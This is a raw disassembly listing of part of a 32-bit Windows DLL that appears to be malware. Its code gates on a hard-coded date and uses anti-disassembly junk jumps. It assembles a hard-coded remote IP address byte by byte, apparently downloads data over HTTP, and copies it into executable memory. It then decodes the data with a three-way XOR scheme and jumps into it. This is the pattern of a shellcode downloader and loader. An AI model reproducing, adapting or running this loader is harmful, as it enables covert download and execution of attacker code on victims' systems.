100017e0:	ab                   	stos   %eax,%es:(%edi)
100017e1:	ab                   	stos   %eax,%es:(%edi)
100017e2:	ab                   	stos   %eax,%es:(%edi)
100017e3:	66 ab                	stos   %ax,%es:(%edi)
100017e5:	8d 85 d0 f9 ff ff    	lea    -0x630(%ebp),%eax
100017eb:	50                   	push   %eax
100017ec:	ff 15 3c 30 00 10    	call   *0x1000303c
100017f2:	b8 e9 07 00 00       	mov    $0x7e9,%eax
100017f7:	66 89 85 c0 f9 ff ff 	mov    %ax,-0x640(%ebp)
100017fe:	6a 06                	push   $0x6
10001800:	58                   	pop    %eax
10001801:	66 89 85 c2 f9 ff ff 	mov    %ax,-0x63e(%ebp)
10001808:	6a 06                	push   $0x6
1000180a:	58                   	pop    %eax
1000180b:	66 89 85 c6 f9 ff ff 	mov    %ax,-0x63a(%ebp)
10001812:	6a 12                	push   $0x12
10001814:	58                   	pop    %eax
10001815:	66 89 85 c8 f9 ff ff 	mov    %ax,-0x638(%ebp)
1000181c:	8d 85 e0 f9 ff ff    	lea    -0x620(%ebp),%eax
10001822:	50                   	push   %eax
10001823:	8d 85 c0 f9 ff ff    	lea    -0x640(%ebp),%eax
10001829:	50                   	push   %eax
1000182a:	ff 15 28 30 00 10    	call   *0x10003028
10001830:	85 c0                	test   %eax,%eax
10001832:	74 3d                	je     0x10001871
10001834:	8d 85 e8 f9 ff ff    	lea    -0x618(%ebp),%eax
1000183a:	50                   	push   %eax
1000183b:	8d 85 d0 f9 ff ff    	lea    -0x630(%ebp),%eax
10001841:	50                   	push   %eax
10001842:	ff 15 28 30 00 10    	call   *0x10003028
10001848:	85 c0                	test   %eax,%eax
1000184a:	74 25                	je     0x10001871
1000184c:	8d 85 e0 f9 ff ff    	lea    -0x620(%ebp),%eax
10001852:	50                   	push   %eax
10001853:	8d 85 e8 f9 ff ff    	lea    -0x618(%ebp),%eax
10001859:	50                   	push   %eax
1000185a:	ff 15 2c 30 00 10    	call   *0x1000302c
10001860:	83 f8 01             	cmp    $0x1,%eax
10001863:	75 0c                	jne    0x10001871
10001865:	6a 00                	push   $0x0
10001867:	ff 15 24 30 00 10    	call   *0x10003024
1000186d:	33 c0                	xor    %eax,%eax
1000186f:	eb 03                	jmp    0x10001874
10001871:	33 c0                	xor    %eax,%eax
10001873:	40                   	inc    %eax
10001874:	5f                   	pop    %edi
10001875:	5e                   	pop    %esi
10001876:	5b                   	pop    %ebx
10001877:	8b 4d ec             	mov    -0x14(%ebp),%ecx
1000187a:	33 cd                	xor    %ebp,%ecx
1000187c:	e8 c3 06 00 00       	call   0x10001f44
10001881:	c9                   	leave
10001882:	c2 0c 00             	ret    $0xc
10001885:	6a 00                	push   $0x0
10001887:	6a 00                	push   $0x0
10001889:	68 3c 32 00 10       	push   $0x1000323c
1000188e:	6a 00                	push   $0x0
10001890:	ff 15 fc 30 00 10    	call   *0x100030fc
10001896:	6a 00                	push   $0x0
10001898:	ff 15 24 30 00 10    	call   *0x10003024
1000189e:	cc                   	int3
1000189f:	8b c1                	mov    %ecx,%eax
100018a1:	c3                   	ret
100018a2:	33 c0                	xor    %eax,%eax
100018a4:	c3                   	ret
100018a5:	55                   	push   %ebp
100018a6:	8b ec                	mov    %esp,%ebp
100018a8:	81 ec 6c 06 00 00    	sub    $0x66c,%esp
100018ae:	a1 00 40 00 10       	mov    0x10004000,%eax
100018b3:	33 c5                	xor    %ebp,%eax
100018b5:	89 45 fc             	mov    %eax,-0x4(%ebp)
100018b8:	53                   	push   %ebx
100018b9:	56                   	push   %esi
100018ba:	57                   	push   %edi
100018bb:	c6 85 00 fa ff ff 00 	movb   $0x0,-0x600(%ebp)
100018c2:	68 03 01 00 00       	push   $0x103
100018c7:	6a 00                	push   $0x0
100018c9:	8d 85 01 fa ff ff    	lea    -0x5ff(%ebp),%eax
100018cf:	50                   	push   %eax
100018d0:	e8 01 0f 00 00       	call   0x100027d6
100018d5:	83 c4 0c             	add    $0xc,%esp
100018d8:	83 a5 ac f9 ff ff 00 	andl   $0x0,-0x654(%ebp)
100018df:	90                   	nop
100018e0:	90                   	nop
100018e1:	90                   	nop
100018e2:	60                   	pusha
100018e3:	e9 31 00 00 00       	jmp    0x10001919
100018e8:	8b ec                	mov    %esp,%ebp
100018ea:	6a ff                	push   $0xffffffff
100018ec:	68 33 22 11 00       	push   $0x112233
100018f1:	68 11 22 33 00       	push   $0x332211
100018f6:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
100018fc:	50                   	push   %eax
100018fd:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
10001904:	58                   	pop    %eax
10001905:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
1000190b:	58                   	pop    %eax
1000190c:	58                   	pop    %eax
1000190d:	58                   	pop    %eax
1000190e:	58                   	pop    %eax
1000190f:	8b e8                	mov    %eax,%ebp
10001911:	b8 50 10 40 00       	mov    $0x401050,%eax
10001916:	50                   	push   %eax
10001917:	e8 c3 61 89 85       	call   0x95897adf
1000191c:	b3 f9                	mov    $0xf9,%bl
1000191e:	ff                   	(bad)
1000191f:	ff 89 8d b9 f9 ff    	decl   -0x64673(%ecx)
10001925:	ff 89 95 bf f9 ff    	decl   -0x6406b(%ecx)
1000192b:	ff 56 55             	call   *0x55(%esi)
1000192e:	56                   	push   %esi
1000192f:	e8 a7 00 00 00       	call   0x100019db
10001934:	c2 10 00             	ret    $0x10
10001937:	f4                   	hlt
10001938:	81 ce 83 ec 04 53    	or     $0x5304ec83,%esi
1000193e:	57                   	push   %edi
1000193f:	57                   	push   %edi
10001940:	57                   	push   %edi
10001941:	e8 0a 00 00 00       	call   0x10001950
10001946:	0f 81 75 02 0f 80    	jno    0x900f1bc1
1000194c:	58                   	pop    %eax
1000194d:	71 06                	jno    0x10001955
1000194f:	e8 58 77 f5 ff       	call   0xff590ac
10001954:	15 59 79 02 81       	adc    $0x81027959,%eax
10001959:	c9                   	leave
1000195a:	81 6c 24 30 38 19 00 	subl   $0x10001938,0x30(%esp)
10001961:	10 
10001962:	83 ec 04             	sub    $0x4,%esp
10001965:	73 12                	jae    0x10001979
10001967:	81 f3 73 01 e9 53    	xor    $0x53e90173,%ebx
1000196d:	55                   	push   %ebp
1000196e:	54                   	push   %esp
1000196f:	83 ec 08             	sub    $0x8,%esp
10001972:	e8 05 00 00 00       	call   0x1000197c
10001977:	0f 83 79 ee 35 5a    	jae    0x6a3607f6
1000197d:	79 02                	jns    0x10001981
1000197f:	0f 8c 83 6c 24 48    	jl     0x58248608
10001985:	02 83 ec 04 7d 07    	add    0x77d04ec(%ebx),%al
1000198b:	81 ef 59 71 0e 0f    	sub    $0xf0e7159,%edi
10001991:	87 52 55             	xchg   %edx,0x55(%edx)
10001994:	83 ec 0c             	sub    $0xc,%esp
10001997:	e8 05 00 00 00       	call   0x100019a1
1000199c:	81 c6 73 08 bc 83    	add    $0x83bc0873,%esi
100019a2:	c4 04 73             	les    (%ebx,%esi,2),%eax
100019a5:	e7 ff                	out    %eax,$0xff
100019a7:	25 81 44 24 5c       	and    $0x5c244481,%eax
100019ac:	30 1a                	xor    %bl,(%edx)
100019ae:	00 10                	add    %dl,(%eax)
100019b0:	83 ec 04             	sub    $0x4,%esp
100019b3:	75 05                	jne    0x100019ba
100019b5:	e9 71 06 0f 8d       	jmp    0x9d0f202b
100019ba:	77 0a                	ja     0x100019c6
100019bc:	0f 84 53 e8 05 00    	je     0x10060215
100019c2:	00 00                	add    %al,(%eax)
100019c4:	0f 84 7f ee bf 83    	je     0x93c00849
100019ca:	c4 68 c3             	les    -0x3d(%eax),%ebp
100019cd:	68 00 00 00 00       	push   $0x0
100019d2:	00 00                	add    %al,(%eax)
100019d4:	00 00                	add    %al,(%eax)
100019d6:	00 00                	add    %al,(%eax)
100019d8:	00 0f                	add    %cl,(%edi)
100019da:	82 83 ec 04 56 54 56 	addb   $0x56,0x545604ec(%ebx)
100019e1:	50                   	push   %eax
100019e2:	51                   	push   %ecx
100019e3:	e8 0d 00 00 00       	call   0x100019f5
100019e8:	0f 8b 7d 05 e8 58    	jnp    0x68e81f6b
100019ee:	75 fa                	jne    0x100019ea
100019f0:	0d 58 73 06 bb       	or     $0xbb067358,%eax
100019f5:	5a                   	pop    %edx
100019f6:	73 f5                	jae    0x100019ed
100019f8:	81 eb 83 44 24 10    	sub    $0x10244483,%ebx
100019fe:	06                   	push   %es
100019ff:	83 ec 04             	sub    $0x4,%esp
10001a02:	77 10                	ja     0x10001a14
10001a04:	0f 83 50 54 51 53    	jae    0x63516e5a
10001a0a:	e8 01 00 00 00       	call   0x10001a10
10001a0f:	bc 73 05 0f 89       	mov    $0x890f0573,%esp
10001a14:	77 f0                	ja     0x10001a06
10001a16:	bf 5a 79 02 81       	mov    $0x8102795a,%edi
10001a1b:	f6 ff                	idiv   %bh
10001a1d:	64 24 24             	fs and $0x24,%al
10001a20:	b5 e1                	mov    $0xe1,%ch
10001a22:	b4 00                	mov    $0x0,%ah
	...
10001a2c:	00 00                	add    %al,(%eax)
10001a2e:	81 e1 83 c4 0c 8b    	and    $0x8b0cc483,%ecx
10001a34:	85 b3 f9 ff ff 8b    	test   %esi,-0x74000007(%ebx)
10001a3a:	8d b9 f9 ff ff 8b    	lea    -0x74000007(%ecx),%edi
10001a40:	95                   	xchg   %eax,%ebp
10001a41:	bf f9 ff ff 68       	mov    $0x68fffff9,%edi
10001a46:	04 01                	add    $0x1,%al
10001a48:	00 00                	add    %al,(%eax)
10001a4a:	6a 00                	push   $0x0
10001a4c:	8d 85 98 fc ff ff    	lea    -0x368(%ebp),%eax
10001a52:	50                   	push   %eax
10001a53:	e8 7e 0d 00 00       	call   0x100027d6
10001a58:	83 c4 0c             	add    $0xc,%esp
10001a5b:	68 04 01 00 00       	push   $0x104
10001a60:	8d 85 98 fc ff ff    	lea    -0x368(%ebp),%eax
10001a66:	50                   	push   %eax
10001a67:	6a 00                	push   $0x0
10001a69:	ff 15 40 30 00 10    	call   *0x10003040
10001a6f:	6a 5c                	push   $0x5c
10001a71:	8d 85 98 fc ff ff    	lea    -0x368(%ebp),%eax
10001a77:	50                   	push   %eax
10001a78:	e8 ba 04 00 00       	call   0x10001f37
10001a7d:	59                   	pop    %ecx
10001a7e:	59                   	pop    %ecx
10001a7f:	40                   	inc    %eax
10001a80:	89 85 a0 f9 ff ff    	mov    %eax,-0x660(%ebp)
10001a86:	8d 85 08 fb ff ff    	lea    -0x4f8(%ebp),%eax
10001a8c:	89 85 9c f9 ff ff    	mov    %eax,-0x664(%ebp)
10001a92:	8b 85 9c f9 ff ff    	mov    -0x664(%ebp),%eax
10001a98:	89 85 98 f9 ff ff    	mov    %eax,-0x668(%ebp)
10001a9e:	8b 85 a0 f9 ff ff    	mov    -0x660(%ebp),%eax
10001aa4:	8a 00                	mov    (%eax),%al
10001aa6:	88 85 97 f9 ff ff    	mov    %al,-0x669(%ebp)
10001aac:	8b 85 9c f9 ff ff    	mov    -0x664(%ebp),%eax
10001ab2:	8a 8d 97 f9 ff ff    	mov    -0x669(%ebp),%cl
10001ab8:	88 08                	mov    %cl,(%eax)
10001aba:	8b 85 a0 f9 ff ff    	mov    -0x660(%ebp),%eax
10001ac0:	40                   	inc    %eax
10001ac1:	89 85 a0 f9 ff ff    	mov    %eax,-0x660(%ebp)
10001ac7:	8b 85 9c f9 ff ff    	mov    -0x664(%ebp),%eax
10001acd:	40                   	inc    %eax
10001ace:	89 85 9c f9 ff ff    	mov    %eax,-0x664(%ebp)
10001ad4:	80 bd 97 f9 ff ff 00 	cmpb   $0x0,-0x669(%ebp)
10001adb:	75 c1                	jne    0x10001a9e
10001add:	be 40 32 00 10       	mov    $0x10003240,%esi
10001ae2:	8d bd a0 fd ff ff    	lea    -0x260(%ebp),%edi
10001ae8:	66 a5                	movsw  %ds:(%esi),%es:(%edi)
10001aea:	a4                   	movsb  %ds:(%esi),%es:(%edi)
10001aeb:	8d 85 a0 fd ff ff    	lea    -0x260(%ebp),%eax
10001af1:	50                   	push   %eax
10001af2:	ff 15 f4 30 00 10    	call   *0x100030f4
10001af8:	85 c0                	test   %eax,%eax
10001afa:	75 2e                	jne    0x10001b2a
10001afc:	be 44 32 00 10       	mov    $0x10003244,%esi
10001b01:	8d bd a0 fd ff ff    	lea    -0x260(%ebp),%edi
10001b07:	66 a5                	movsw  %ds:(%esi),%es:(%edi)
10001b09:	a4                   	movsb  %ds:(%esi),%es:(%edi)
10001b0a:	8d 85 a0 fd ff ff    	lea    -0x260(%ebp),%eax
10001b10:	50                   	push   %eax
10001b11:	ff 15 f4 30 00 10    	call   *0x100030f4
10001b17:	85 c0                	test   %eax,%eax
10001b19:	75 0f                	jne    0x10001b2a
10001b1b:	6a 00                	push   $0x0
10001b1d:	ff 15 24 30 00 10    	call   *0x10003024
10001b23:	33 c0                	xor    %eax,%eax
10001b25:	e9 fe 03 00 00       	jmp    0x10001f28
10001b2a:	83 a5 d0 fe ff ff 00 	andl   $0x0,-0x130(%ebp)
10001b31:	83 a5 24 fc ff ff 00 	andl   $0x0,-0x3dc(%ebp)
10001b38:	83 a5 b8 fe ff ff 00 	andl   $0x0,-0x148(%ebp)
10001b3f:	c7 85 ac fe ff ff 00 	movl   $0x1000,-0x154(%ebp)
10001b46:	10 00 00 
10001b49:	83 a5 1c fc ff ff 00 	andl   $0x0,-0x3e4(%ebp)
10001b50:	83 a5 20 fc ff ff 00 	andl   $0x0,-0x3e0(%ebp)
10001b57:	83 a5 bc fe ff ff 00 	andl   $0x0,-0x144(%ebp)
10001b5e:	83 a5 b0 fe ff ff 00 	andl   $0x0,-0x150(%ebp)
10001b65:	a1 48 32 00 10       	mov    0x10003248,%eax
10001b6a:	89 85 d8 fe ff ff    	mov    %eax,-0x128(%ebp)
10001b70:	a1 4c 32 00 10       	mov    0x1000324c,%eax
10001b75:	89 85 dc fe ff ff    	mov    %eax,-0x124(%ebp)
10001b7b:	c6 45 ec 33          	movb   $0x33,-0x14(%ebp)
10001b7f:	c6 45 ed 38          	movb   $0x38,-0x13(%ebp)
10001b83:	c6 45 ee 2e          	movb   $0x2e,-0x12(%ebp)
10001b87:	c6 45 ef 31          	movb   $0x31,-0x11(%ebp)
10001b8b:	c6 45 f0 38          	movb   $0x38,-0x10(%ebp)
10001b8f:	c6 45 f1 31          	movb   $0x31,-0xf(%ebp)
10001b93:	c6 45 f2 2e          	movb   $0x2e,-0xe(%ebp)
10001b97:	c6 45 f3 34          	movb   $0x34,-0xd(%ebp)
10001b9b:	c6 45 f4 32          	movb   $0x32,-0xc(%ebp)
10001b9f:	c6 45 f5 2e          	movb   $0x2e,-0xb(%ebp)
10001ba3:	c6 45 f6 31          	movb   $0x31,-0xa(%ebp)
10001ba7:	c6 45 f7 32          	movb   $0x32,-0x9(%ebp)
10001bab:	c6 45 f8 37          	movb   $0x37,-0x8(%ebp)
10001baf:	c6 45 f9 00          	movb   $0x0,-0x7(%ebp)
10001bb3:	c6 85 28 fc ff ff 73 	movb   $0x73,-0x3d8(%ebp)
10001bba:	c6 85 29 fc ff ff 61 	movb   $0x61,-0x3d7(%ebp)
10001bc1:	c6 85 2a fc ff ff 66 	movb   $0x66,-0x3d6(%ebp)
10001bc8:	c6 85 2b fc ff ff 65 	movb   $0x65,-0x3d5(%ebp)
10001bcf:	c6 85 2c fc ff ff 00 	movb   $0x0,-0x3d4(%ebp)
10001bd6:	c6 85 30 fc ff ff 00 	movb   $0x0,-0x3d0(%ebp)
10001bdd:	6a 07                	push   $0x7
10001bdf:	59                   	pop    %ecx
10001be0:	33 c0                	xor    %eax,%eax
10001be2:	8d bd 31 fc ff ff    	lea    -0x3cf(%ebp),%edi
10001be8:	f3 ab                	rep stos %eax,%es:(%edi)
10001bea:	66 ab                	stos   %ax,%es:(%edi)
10001bec:	aa                   	stos   %al,%es:(%edi)
10001bed:	6a 44                	push   $0x44
10001bef:	6a 00                	push   $0x0
10001bf1:	8d 85 50 fc ff ff    	lea    -0x3b0(%ebp),%eax
10001bf7:	50                   	push   %eax
10001bf8:	e8 d9 0b 00 00       	call   0x100027d6
10001bfd:	83 c4 0c             	add    $0xc,%esp
10001c00:	8d 75 ec             	lea    -0x14(%ebp),%esi
10001c03:	8d bd 30 fc ff ff    	lea    -0x3d0(%ebp),%edi
10001c09:	a5                   	movsl  %ds:(%esi),%es:(%edi)
10001c0a:	a5                   	movsl  %ds:(%esi),%es:(%edi)
10001c0b:	a5                   	movsl  %ds:(%esi),%es:(%edi)
10001c0c:	66 a5                	movsw  %ds:(%esi),%es:(%edi)
10001c0e:	8d b5 28 fc ff ff    	lea    -0x3d8(%ebp),%esi
10001c14:	8d bd 50 fc ff ff    	lea    -0x3b0(%ebp),%edi
10001c1a:	a5                   	movsl  %ds:(%esi),%es:(%edi)
10001c1b:	a4                   	movsb  %ds:(%esi),%es:(%edi)
10001c1c:	be 50 32 00 10       	mov    $0x10003250,%esi
10001c21:	8d bd 60 fc ff ff    	lea    -0x3a0(%ebp),%edi
10001c27:	a5                   	movsl  %ds:(%esi),%es:(%edi)
10001c28:	a5                   	movsl  %ds:(%esi),%es:(%edi)
10001c29:	66 a5                	movsw  %ds:(%esi),%es:(%edi)
10001c2b:	a4                   	movsb  %ds:(%esi),%es:(%edi)
10001c2c:	be 5c 32 00 10       	mov    $0x1000325c,%esi
10001c31:	8d bd 74 fc ff ff    	lea    -0x38c(%ebp),%edi
10001c37:	a5                   	movsl  %ds:(%esi),%es:(%edi)
10001c38:	a5                   	movsl  %ds:(%esi),%es:(%edi)
10001c39:	a5                   	movsl  %ds:(%esi),%es:(%edi)
10001c3a:	a4                   	movsb  %ds:(%esi),%es:(%edi)
10001c3b:	c7 85 70 fc ff ff 01 	movl   $0x1,-0x390(%ebp)
10001c42:	00 00 00 
10001c45:	be 6c 32 00 10       	mov    $0x1000326c,%esi
10001c4a:	8d bd e0 fe ff ff    	lea    -0x120(%ebp),%edi
10001c50:	a5                   	movsl  %ds:(%esi),%es:(%edi)
10001c51:	a5                   	movsl  %ds:(%esi),%es:(%edi)
10001c52:	a5                   	movsl  %ds:(%esi),%es:(%edi)
10001c53:	68 f8 00 00 00       	push   $0xf8
10001c58:	6a 00                	push   $0x0
10001c5a:	8d 85 ec fe ff ff    	lea    -0x114(%ebp),%eax
10001c60:	50                   	push   %eax
10001c61:	e8 70 0b 00 00       	call   0x100027d6
10001c66:	83 c4 0c             	add    $0xc,%esp
10001c69:	c6 85 e0 fe ff ff 57 	movb   $0x57,-0x120(%ebp)
10001c70:	6a 00                	push   $0x0
10001c72:	6a 00                	push   $0x0
10001c74:	6a 00                	push   $0x0
10001c76:	6a 00                	push   $0x0
10001c78:	8d 85 e0 fe ff ff    	lea    -0x120(%ebp),%eax
10001c7e:	50                   	push   %eax
10001c7f:	ff 15 18 31 00 10    	call   *0x10003118
10001c85:	89 85 14 fc ff ff    	mov    %eax,-0x3ec(%ebp)
10001c8b:	6a 00                	push   $0x0
10001c8d:	68 00 00 00 08       	push   $0x8000000
10001c92:	6a 01                	push   $0x1
10001c94:	8d 85 60 fc ff ff    	lea    -0x3a0(%ebp),%eax
10001c9a:	50                   	push   %eax
10001c9b:	8d 85 50 fc ff ff    	lea    -0x3b0(%ebp),%eax
10001ca1:	50                   	push   %eax
10001ca2:	6a 00                	push   $0x0
10001ca4:	8d 85 30 fc ff ff    	lea    -0x3d0(%ebp),%eax
10001caa:	50                   	push   %eax
10001cab:	ff b5 14 fc ff ff    	push   -0x3ec(%ebp)
10001cb1:	ff 15 1c 31 00 10    	call   *0x1000311c
10001cb7:	89 85 18 fc ff ff    	mov    %eax,-0x3e8(%ebp)
10001cbd:	83 bd 18 fc ff ff 00 	cmpl   $0x0,-0x3e8(%ebp)
10001cc4:	75 13                	jne    0x10001cd9
10001cc6:	ff b5 14 fc ff ff    	push   -0x3ec(%ebp)
10001ccc:	ff 15 2c 31 00 10    	call   *0x1000312c
10001cd2:	33 c0                	xor    %eax,%eax
10001cd4:	e9 4f 02 00 00       	jmp    0x10001f28
10001cd9:	6a 00                	push   $0x0
10001cdb:	68 02 00 00 80       	push   $0x80000002
10001ce0:	68 00 00 00 80       	push   $0x80000000
10001ce5:	8d 85 d8 fe ff ff    	lea    -0x128(%ebp),%eax
10001ceb:	50                   	push   %eax
10001cec:	ff b5 18 fc ff ff    	push   -0x3e8(%ebp)
10001cf2:	ff 15 20 31 00 10    	call   *0x10003120
10001cf8:	89 85 d0 fe ff ff    	mov    %eax,-0x130(%ebp)
10001cfe:	83 bd d0 fe ff ff 00 	cmpl   $0x0,-0x130(%ebp)
10001d05:	75 1f                	jne    0x10001d26
10001d07:	ff b5 18 fc ff ff    	push   -0x3e8(%ebp)
10001d0d:	ff 15 2c 31 00 10    	call   *0x1000312c
10001d13:	ff b5 14 fc ff ff    	push   -0x3ec(%ebp)
10001d19:	ff 15 2c 31 00 10    	call   *0x1000312c
10001d1f:	33 c0                	xor    %eax,%eax
10001d21:	e9 02 02 00 00       	jmp    0x10001f28
10001d26:	6a 00                	push   $0x0
10001d28:	ff b5 d0 fe ff ff    	push   -0x130(%ebp)
10001d2e:	ff 15 28 31 00 10    	call   *0x10003128
10001d34:	89 85 b8 fe ff ff    	mov    %eax,-0x148(%ebp)
10001d3a:	ff b5 b8 fe ff ff    	push   -0x148(%ebp)
10001d40:	e8 0f 02 00 00       	call   0x10001f54
10001d45:	59                   	pop    %ecx
10001d46:	89 85 a8 f9 ff ff    	mov    %eax,-0x658(%ebp)
10001d4c:	8b 85 a8 f9 ff ff    	mov    -0x658(%ebp),%eax
10001d52:	89 85 24 fc ff ff    	mov    %eax,-0x3dc(%ebp)
10001d58:	ff b5 ac fe ff ff    	push   -0x154(%ebp)
10001d5e:	e8 f1 01 00 00       	call   0x10001f54
10001d63:	59                   	pop    %ecx
10001d64:	89 85 a4 f9 ff ff    	mov    %eax,-0x65c(%ebp)
10001d6a:	8b 85 a4 f9 ff ff    	mov    -0x65c(%ebp),%eax
10001d70:	89 85 1c fc ff ff    	mov    %eax,-0x3e4(%ebp)
10001d76:	8d 85 20 fc ff ff    	lea    -0x3e0(%ebp),%eax
10001d7c:	50                   	push   %eax
10001d7d:	ff b5 ac fe ff ff    	push   -0x154(%ebp)
10001d83:	ff b5 1c fc ff ff    	push   -0x3e4(%ebp)
10001d89:	ff b5 d0 fe ff ff    	push   -0x130(%ebp)
10001d8f:	ff 15 24 31 00 10    	call   *0x10003124
10001d95:	89 85 b0 fe ff ff    	mov    %eax,-0x150(%ebp)
10001d9b:	83 bd b0 fe ff ff 00 	cmpl   $0x0,-0x150(%ebp)
10001da2:	75 02                	jne    0x10001da6
10001da4:	eb 41                	jmp    0x10001de7
10001da6:	ff b5 20 fc ff ff    	push   -0x3e0(%ebp)
10001dac:	ff b5 1c fc ff ff    	push   -0x3e4(%ebp)
10001db2:	8b 85 24 fc ff ff    	mov    -0x3dc(%ebp),%eax
10001db8:	03 85 bc fe ff ff    	add    -0x144(%ebp),%eax
10001dbe:	50                   	push   %eax
10001dbf:	e8 0c 0a 00 00       	call   0x100027d0
10001dc4:	83 c4 0c             	add    $0xc,%esp
10001dc7:	8b 85 bc fe ff ff    	mov    -0x144(%ebp),%eax
10001dcd:	03 85 20 fc ff ff    	add    -0x3e0(%ebp),%eax
10001dd3:	89 85 bc fe ff ff    	mov    %eax,-0x144(%ebp)
10001dd9:	8b 85 b8 fe ff ff    	mov    -0x148(%ebp),%eax
10001ddf:	3b 85 bc fe ff ff    	cmp    -0x144(%ebp),%eax
10001de5:	77 8f                	ja     0x10001d76
10001de7:	ff b5 d0 fe ff ff    	push   -0x130(%ebp)
10001ded:	ff 15 2c 31 00 10    	call   *0x1000312c
10001df3:	ff b5 18 fc ff ff    	push   -0x3e8(%ebp)
10001df9:	ff 15 2c 31 00 10    	call   *0x1000312c
10001dff:	ff b5 14 fc ff ff    	push   -0x3ec(%ebp)
10001e05:	ff 15 2c 31 00 10    	call   *0x1000312c
10001e0b:	8b 85 b8 fe ff ff    	mov    -0x148(%ebp),%eax
10001e11:	89 85 c0 fe ff ff    	mov    %eax,-0x140(%ebp)
10001e17:	6a 40                	push   $0x40
10001e19:	68 00 30 00 00       	push   $0x3000
10001e1e:	ff b5 c0 fe ff ff    	push   -0x140(%ebp)
10001e24:	6a 00                	push   $0x0
10001e26:	ff 15 50 30 00 10    	call   *0x10003050
10001e2c:	89 85 b4 fe ff ff    	mov    %eax,-0x14c(%ebp)
10001e32:	83 bd b4 fe ff ff 00 	cmpl   $0x0,-0x14c(%ebp)
10001e39:	75 07                	jne    0x10001e42
10001e3b:	33 c0                	xor    %eax,%eax
10001e3d:	e9 e6 00 00 00       	jmp    0x10001f28
10001e42:	83 a5 d4 fe ff ff 00 	andl   $0x0,-0x12c(%ebp)
10001e49:	eb 0d                	jmp    0x10001e58
10001e4b:	8b 85 d4 fe ff ff    	mov    -0x12c(%ebp),%eax
10001e51:	40                   	inc    %eax
10001e52:	89 85 d4 fe ff ff    	mov    %eax,-0x12c(%ebp)
10001e58:	8b 85 d4 fe ff ff    	mov    -0x12c(%ebp),%eax
10001e5e:	3b 85 c0 fe ff ff    	cmp    -0x140(%ebp),%eax
10001e64:	0f 83 a7 00 00 00    	jae    0x10001f11
10001e6a:	8b 85 d4 fe ff ff    	mov    -0x12c(%ebp),%eax
10001e70:	33 d2                	xor    %edx,%edx
10001e72:	6a 03                	push   $0x3
10001e74:	59                   	pop    %ecx
10001e75:	f7 f1                	div    %ecx
10001e77:	85 d2                	test   %edx,%edx
10001e79:	75 22                	jne    0x10001e9d
10001e7b:	8b 85 24 fc ff ff    	mov    -0x3dc(%ebp),%eax
10001e81:	03 85 d4 fe ff ff    	add    -0x12c(%ebp),%eax
10001e87:	0f b6 00             	movzbl (%eax),%eax
10001e8a:	83 f0 57             	xor    $0x57,%eax
10001e8d:	8b 8d b4 fe ff ff    	mov    -0x14c(%ebp),%ecx
10001e93:	03 8d d4 fe ff ff    	add    -0x12c(%ebp),%ecx
10001e99:	88 01                	mov    %al,(%ecx)
10001e9b:	eb 6f                	jmp    0x10001f0c
10001e9d:	8b 85 d4 fe ff ff    	mov    -0x12c(%ebp),%eax
10001ea3:	33 d2                	xor    %edx,%edx
10001ea5:	6a 03                	push   $0x3
10001ea7:	59                   	pop    %ecx
10001ea8:	f7 f1                	div    %ecx
10001eaa:	83 fa 01             	cmp    $0x1,%edx
10001ead:	75 22                	jne    0x10001ed1
10001eaf:	8b 85 24 fc ff ff    	mov    -0x3dc(%ebp),%eax
10001eb5:	03 85 d4 fe ff ff    	add    -0x12c(%ebp),%eax
10001ebb:	0f b6 00             	movzbl (%eax),%eax
10001ebe:	83 f0 77             	xor    $0x77,%eax
10001ec1:	8b 8d b4 fe ff ff    	mov    -0x14c(%ebp),%ecx
10001ec7:	03 8d d4 fe ff ff    	add    -0x12c(%ebp),%ecx
10001ecd:	88 01                	mov    %al,(%ecx)
10001ecf:	eb 3b                	jmp    0x10001f0c
10001ed1:	8b 85 d4 fe ff ff    	mov    -0x12c(%ebp),%eax
10001ed7:	33 d2                	xor    %edx,%edx
10001ed9:	6a 03                	push   $0x3
10001edb:	59                   	pop    %ecx
10001edc:	f7 f1                	div    %ecx
10001ede:	83 fa 02             	cmp    $0x2,%edx
10001ee1:	75 29                	jne    0x10001f0c
10001ee3:	8b 85 24 fc ff ff    	mov    -0x3dc(%ebp),%eax
10001ee9:	03 85 d4 fe ff ff    	add    -0x12c(%ebp),%eax
10001eef:	0f b6 00             	movzbl (%eax),%eax
10001ef2:	83 f0 36             	xor    $0x36,%eax
10001ef5:	0f b6 8d d4 fe ff ff 	movzbl -0x12c(%ebp),%ecx
10001efc:	33 c1                	xor    %ecx,%eax
10001efe:	8b 8d b4 fe ff ff    	mov    -0x14c(%ebp),%ecx
10001f04:	03 8d d4 fe ff ff    	add    -0x12c(%ebp),%ecx
10001f0a:	88 01                	mov    %al,(%ecx)
10001f0c:	e9 3a ff ff ff       	jmp    0x10001e4b
10001f11:	8d 85 30 fc ff ff    	lea    -0x3d0(%ebp),%eax
10001f17:	50                   	push   %eax
10001f18:	ff 95 b4 fe ff ff    	call   *-0x14c(%ebp)
10001f1e:	6a 00                	push   $0x0
10001f20:	ff 15 24 30 00 10    	call   *0x10003024
10001f26:	33 c0                	xor    %eax,%eax
10001f28:	5f                   	pop    %edi
10001f29:	5e                   	pop    %esi
10001f2a:	5b                   	pop    %ebx
10001f2b:	8b 4d fc             	mov    -0x4(%ebp),%ecx
10001f2e:	33 cd                	xor    %ebp,%ecx
10001f30:	e8 0f 00 00 00       	call   0x10001f44
10001f35:	c9                   	leave
10001f36:	c3                   	ret
10001f37:	ff 25 b4 30 00 10    	jmp    *0x100030b4
10001f3d:	cc                   	int3
10001f3e:	ff 25 a8 30 00 10    	jmp    *0x100030a8
10001f44:	3b 0d 00 40 00 10    	cmp    0x10004000,%ecx
10001f4a:	75 02                	jne    0x10001f4e
10001f4c:	f3 c3                	repz ret
10001f4e:	e9 b5 03 00 00       	jmp    0x10002308
10001f53:	cc                   	int3
10001f54:	ff 25 ac 30 00 10    	jmp    *0x100030ac
10001f5a:	8b ff                	mov    %edi,%edi
10001f5c:	56                   	push   %esi
10001f5d:	68 80 00 00 00       	push   $0x80
10001f62:	ff 15 bc 30 00 10    	call   *0x100030bc
10001f68:	8b f0                	mov    %eax,%esi
10001f6a:	56                   	push   %esi
10001f6b:	ff 15 b8 30 00 10    	call   *0x100030b8
10001f71:	59                   	pop    %ecx
10001f72:	59                   	pop    %ecx
10001f73:	a3 5c 43 00 10       	mov    %eax,0x1000435c
10001f78:	a3 58 43 00 10       	mov    %eax,0x10004358
10001f7d:	85 f6                	test   %esi,%esi
10001f7f:	75 05                	jne    0x10001f86
